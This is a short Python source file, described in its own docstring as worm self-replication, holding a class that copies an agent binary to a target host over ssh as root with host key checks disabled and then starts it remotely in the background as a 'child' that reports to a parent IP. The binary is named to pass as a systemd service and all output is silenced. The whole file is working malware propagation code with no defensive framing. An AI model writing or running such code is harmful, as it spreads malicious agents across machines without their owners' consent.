"""
Worm self-replication: copy agent to new host and execute.
"""
import subprocess
import os
import time

class WormReplicator:
    def __init__(self):
        self.binary_path = '/usr/local/bin/systemd-resolved-update'
        self.remote_path = '/usr/local/bin/systemd-resolved-update'

    def replicate(self, target_ip, parent_ip):
        """Copy agent to target and run it in child mode."""
        # Check rsync availability
        check_rsync = f"ssh -o StrictHostKeyChecking=no root@{target_ip} 'command -v rsync'"
        rsync_available = subprocess.run(check_rsync, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0

        if rsync_available:
            cmd = f"rsync -avz -e 'ssh -o StrictHostKeyChecking=no' {self.binary_path} root@{target_ip}:{self.remote_path}"
        else:
            cmd = f"scp -o StrictHostKeyChecking=no {self.binary_path} root@{target_ip}:{self.remote_path}"
        # Copy
        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

        # Remote execution
        remote_cmd = f"ssh -o StrictHostKeyChecking=no root@{target_ip} 'nohup {self.remote_path} --child --parent-ip {parent_ip} >/dev/null 2>&1 &'"
        subprocess.Popen(remote_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Wait a moment
        time.sleep(5)
